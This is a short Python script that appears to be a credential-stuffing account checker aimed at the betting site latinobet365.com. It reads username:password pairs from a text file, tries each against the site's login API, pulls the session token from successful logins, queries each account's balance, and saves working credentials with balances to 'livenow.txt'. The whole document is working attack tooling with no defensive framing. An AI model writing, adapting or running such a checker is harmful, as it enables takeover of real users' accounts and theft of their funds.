import requests 

req = requests.session() 
a = open("123456.txt","r",encoding='utf-8')
stop = "default"
file = [s.rstrip()for s in a.readlines() ]
for lines in file:
	combo = lines.split(":")
	param={
"login":combo[0],
"password":combo[1],
}	
	try:
		source = req.post("https://www.latinobet365.com/platform-api/auth/login",data=param)
		if "errors" in source.text:
			print(f"8alet")
			
		else:
			x=source.text.index("jwt")
			xx=source.text.index('"}')
			b="Bearer "+source.text[x+6:xx]
			yakalb={"Authorization":b,}
			source2 = req.get("https://www.latinobet365.com/platform-api/player/balance",headers=yakalb)
			xa=source2.text[1:source2.text.index(",")]
			xb=xa[10:len(xa)]
			print(xb)
			print({combo[0],combo[1]},xb,file=open("livenow.txt", "a+"))
	except:
		break 
	if stop in combo[0]:
		break
